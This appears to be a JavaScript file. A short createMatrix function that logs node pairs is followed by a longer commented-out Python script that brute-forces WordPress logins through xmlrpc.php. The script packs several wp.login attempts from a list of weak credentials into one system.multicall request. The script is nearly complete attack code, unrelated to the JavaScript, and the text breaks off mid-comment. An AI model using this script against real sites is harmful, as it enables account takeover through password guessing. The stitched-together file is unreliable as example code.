export function createMatrix(connections) {
    console.log(connections)
    Object.values(connections).forEach(e => {
        const [node1, node2] = e.id.split('-');

        console.log(node1, node2)
    });
}



// import requests

// # Define the target WordPress site URL (xmlrpc.php endpoint)
// url = 'https://yourwordpresssite.com/xmlrpc.php'

// # List of credentials to try (username, password)
// credentials = [
//     ('admin', 'password123'),
//     ('admin', '12345678'),
//     ('user1', 'password123'),
//     ('user2', 'password456'),
// ]

// # Construct XML payload to use the system.multicall method (multiple login attempts in one request)
// xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
// <methodCall>
//   <methodName>system.multicall</methodName>
//   <params>
// """

// # Loop through credentials and add them to the XML request
// for username, password in credentials:
//     xml_payload += f"""
//     <param>
//       <value>
//         <struct>
//           <member>
//             <name>methodName</name>
//             <value><string>wp.login</string></value>
//           </member>
//           <member>
//             <name>params</name>
//             <value>
//               <array>
//                 <data>
//                   <value><string>{username}</string></value>
//                   <value><string>{password}</string></value>
//                 </data>
//               </array>
//             </value>
//           </member>
//         </struct>
//       </value>
//     </param>
//     """

// # Close the XML structure
// xml_payload += """
//   </params>
// </methodCall>
// """

// # Send the POST request to the WordPress xmlrpc.php endpoint
// headers = {'Content-Type': 'application/xml'}
// response = requests.post(url, data=xml_payload, headers=headers)

// # Output the response (for analysis
